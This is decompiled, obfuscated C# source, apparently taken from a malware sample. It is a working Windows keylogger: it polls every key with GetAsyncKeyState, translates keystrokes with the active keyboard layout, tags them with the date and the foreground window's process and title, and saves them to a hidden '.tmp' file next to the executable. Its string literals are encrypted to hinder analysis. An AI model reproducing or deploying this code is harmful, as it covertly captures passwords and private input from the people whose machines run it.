using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace ns0;

public class GClass3
{
	private int int_0;

	private string string_0;

	private Keys keys_0;

	public Clock clock_0;

	public string string_1;

	private object object_0;

	public string string_2;

	public GClass3()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0025: Expected O, but got Unknown
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0046: Expected O, but got Unknown
		keys_0 = (Keys)0;
		clock_0 = new Clock();
		string_1 = GClass4.smethod_0("");
		object_0 = (object)new Keyboard();
		string_2 = Assembly.GetExecutingAssembly().Location + new string(new char[4] { '.', 't', 'm', 'p' });
	}

	[DllImport("user32.dll")]
	private static extern int ToUnicodeEx(uint uint_0, uint uint_1, byte[] byte_0, [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder stringBuilder_0, int int_1, uint uint_2, IntPtr intptr_0);

	[DllImport("user32.dll")]
	private static extern bool GetKeyboardState(byte[] byte_0);

	[DllImport("user32.dll")]
	private static extern uint MapVirtualKey(uint uint_0, uint uint_1);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowThreadProcessId(IntPtr intptr_0, ref int int_1);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetKeyboardLayout(int int_1);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetForegroundWindow();

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern short GetAsyncKeyState(int int_1);

	private string method_0()
	{
		try
		{
			IntPtr foregroundWindow = GetForegroundWindow();
			int int_ = default(int);
			GetWindowThreadProcessId(foregroundWindow, ref int_);
			object processById = Process.GetProcessById(int_);
			if (!Conversions.ToBoolean(Operators.OrObject(Operators.AndObject((object)(foregroundWindow.ToInt32() == int_0), Operators.CompareObjectEqual((object)string_0, NewLateBinding.LateGet(processById, (Type)null, GClass4.smethod_0("Bůɤ\u0362ќգ٧ݬࡨॱ\u0a51୭౷൮\u0e64"), new object[0], (string[])null, (Type[])null, (bool[])null), false)), Operators.CompareObjectEqual(NewLateBinding.LateGet(NewLateBinding.LateGet(processById, (Type)null, GClass4.smethod_0("Bůɤ\u0362ќգ٧ݬࡨॱ\u0a51୭౷൮\u0e64"), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, GClass4.smethod_0("JŠɪ\u0364Ѷթ"), new object[0], (string[])null, (Type[])null, (bool[])null), (object)0, false))))
			{
				int_0 = foregroundWindow.ToInt32();
				string_0 = Conversions.ToString(NewLateBinding.LateGet(processById, (Type)null, GClass4.smethod_0("Bůɤ\u0362ќգ٧ݬࡨॱ\u0a51୭౷൮\u0e64"), new object[0], (string[])null, (Type[])null, (bool[])null));
				return Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(GClass4.smethod_0("\u000eĈȀ") + method_1(), GClass4.smethod_0("!")), NewLateBinding.LateGet(processById, (Type)null, GClass4.smethod_0("[Ÿɦ\u036bѢյٶ\u074aࡢ९\u0a64"), new object[0], (string[])null, (Type[])null, (bool[])null)), (object)GClass4.smethod_0("!")), (object)string_0), (object)'\u0001'), (object)GClass4.smethod_0("\u000fċ")));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return GClass4.smethod_0("");
	}

	private string method_1()
	{
		try
		{
			return clock_0.get_LocalTime().ToString(new string(new char[8] { 'y', 'y', '/', 'M', 'M', '/', 'd', 'd' }));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = new string(new char[8] { '?', '?', '/', '?', '?', '/', '?', '?' });
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private static string smethod_0(uint uint_0)
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			byte[] byte_ = new byte[255];
			if (!GetKeyboardState(byte_))
			{
				return GClass4.smethod_0("");
			}
			uint uint_ = MapVirtualKey(uint_0, 0u);
			IntPtr foregroundWindow = GetForegroundWindow();
			int int_ = 0;
			int windowThreadProcessId = GetWindowThreadProcessId(foregroundWindow, ref int_);
			IntPtr intptr_ = (IntPtr)GetKeyboardLayout(windowThreadProcessId);
			ToUnicodeEx(uint_0, uint_, byte_, stringBuilder, 5, 0u, intptr_);
			return stringBuilder.ToString();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return ((Enum)(Keys)checked((int)uint_0)).ToString();
	}

	private string method_2(Keys keys_1)
	{
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_0081: Unknown result type (might be due to invalid IL or missing references)
		//IL_0087: Invalid comparison between Unknown and I4
		//IL_008c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0092: Invalid comparison between Unknown and I4
		//IL_0097: Unknown result type (might be due to invalid IL or missing references)
		//IL_009d: Invalid comparison between Unknown and I4
		//IL_00a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a8: Invalid comparison between Unknown and I4
		//IL_00ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b3: Invalid comparison between Unknown and I4
		//IL_00b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00be: Invalid comparison between Unknown and I4
		//IL_00c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c9: Invalid comparison between Unknown and I4
		//IL_00ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d4: Invalid comparison between Unknown and I4
		//IL_00d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00df: Invalid comparison between Unknown and I4
		//IL_00e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ea: Invalid comparison between Unknown and I4
		//IL_00ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f5: Invalid comparison between Unknown and I4
		//IL_00fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_0100: Invalid comparison between Unknown and I4
		//IL_0105: Unknown result type (might be due to invalid IL or missing references)
		//IL_010b: Invalid comparison between Unknown and I4
		//IL_0110: Unknown result type (might be due to invalid IL or missing references)
		//IL_0116: Invalid comparison between Unknown and I4
		//IL_011b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0121: Invalid comparison between Unknown and I4
		//IL_0128: Unknown result type (might be due to invalid IL or missing references)
		//IL_012e: Invalid comparison between Unknown and I4
		//IL_0133: Unknown result type (might be due to invalid IL or missing references)
		//IL_0139: Invalid comparison between Unknown and I4
		//IL_013e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0144: Invalid comparison between Unknown and I4
		//IL_0149: Unknown result type (might be due to invalid IL or missing references)
		//IL_014f: Invalid comparison between Unknown and I4
		//IL_0154: Unknown result type (might be due to invalid IL or missing references)
		//IL_015a: Invalid comparison between Unknown and I4
		//IL_015f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0165: Invalid comparison between Unknown and I4
		//IL_016a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0170: Invalid comparison between Unknown and I4
		//IL_0175: Unknown result type (might be due to invalid IL or missing references)
		//IL_017b: Invalid comparison between Unknown and I4
		//IL_0180: Unknown result type (might be due to invalid IL or missing references)
		//IL_0186: Invalid comparison between Unknown and I4
		//IL_018d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0193: Invalid comparison between Unknown and I4
		//IL_01b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_01be: Invalid comparison between Unknown and I4
		//IL_01c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c9: Invalid comparison between Unknown and I4
		//IL_01d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d6: Invalid comparison between Unknown and I4
		//IL_023d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0252: Unknown result type (might be due to invalid IL or missing references)
		//IL_0384: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b7: Expected I4, but got Unknown
		//IL_03cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_03d6: Expected I4, but got Unknown
		bool flag = Conversions.ToBoolean(NewLateBinding.LateGet(object_0, (Type)null, GClass4.smethod_0("_ţɣ\u036fѼՌ٣ݼࡀ६\u0a75୯"), new object[0], (string[])null, (Type[])null, (bool[])null));
		if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(object_0, (Type)null, GClass4.smethod_0("KŦɶͶшլ١ݪ"), new object[0], (string[])null, (Type[])null, (bool[])null), (object)true, false))
		{
			flag = ((!flag) ? true : false);
		}
		try
		{
			if ((int)keys_1 != 112 && (int)keys_1 != 113 && (int)keys_1 != 114 && (int)keys_1 != 115 && (int)keys_1 != 116 && (int)keys_1 != 117 && (int)keys_1 != 118 && (int)keys_1 != 119 && (int)keys_1 != 120 && (int)keys_1 != 121 && (int)keys_1 != 122 && (int)keys_1 != 123 && (int)keys_1 != 35 && (int)keys_1 != 46 && (int)keys_1 != 8)
			{
				if ((int)keys_1 != 160 && (int)keys_1 != 161 && (int)keys_1 != 65536 && (int)keys_1 != 16 && (int)keys_1 != 131072 && (int)keys_1 != 17 && (int)keys_1 != 163 && (int)keys_1 != 162 && (int)keys_1 != 262144)
				{
					if ((int)keys_1 == 32)
					{
						return new string(new char[1] { ' ' });
					}
					if ((int)keys_1 != 13 && (int)keys_1 != 13)
					{
						if ((int)keys_1 == 9)
						{
							return new string(new char[5] { '[', 'T', 'A', 'P', ']' }) + GClass4.smethod_0("\u000fċ");
						}
						checked
						{
							if (flag)
							{
								return smethod_0((uint)keys_1).ToUpper();
							}
							return smethod_0((uint)keys_1);
						}
					}
					if (string_1.EndsWith(new string(new char[7] { '[', 'E', 'N', 'T', 'E', 'R', ']' }) + GClass4.smethod_0("\u000fċ")))
					{
						return GClass4.smethod_0("");
					}
					return new string(new char[7] { '[', 'E', 'N', 'T', 'E', 'R', ']' }) + GClass4.smethod_0("\u000fċ");
				}
				return GClass4.smethod_0("");
			}
			return GClass4.smethod_0("Z") + ((Enum)keys_1).ToString() + GClass4.smethod_0("\\");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result;
			if (flag)
			{
				result = Strings.ChrW((int)keys_1).ToString().ToUpper();
				ProjectData.ClearProjectError();
				return result;
			}
			result = Strings.ChrW((int)keys_1).ToString().ToLower();
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public void method_3()
	{
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string_1 = File.ReadAllText(string_2);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		checked
		{
			try
			{
				int num = 0;
				while (true)
				{
					num++;
					int num2 = 0;
					do
					{
						if (GetAsyncKeyState(num2) == -32767)
						{
							Keys keys_ = (Keys)num2;
							string text = method_2(keys_);
							if (text.Length > 0)
							{
								string_1 += method_0();
								string_1 += text;
							}
							keys_0 = keys_;
						}
						num2++;
					}
					while (num2 <= 255);
					if (num == 1000)
					{
						num = 0;
						int num3 = 20480;
						if (string_1.Length > 20480)
						{
							string_1 = string_1.Remove(0, string_1.Length - num3);
						}
						File.WriteAllText(string_2, string_1);
					}
					Thread.Sleep(1);
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}
}
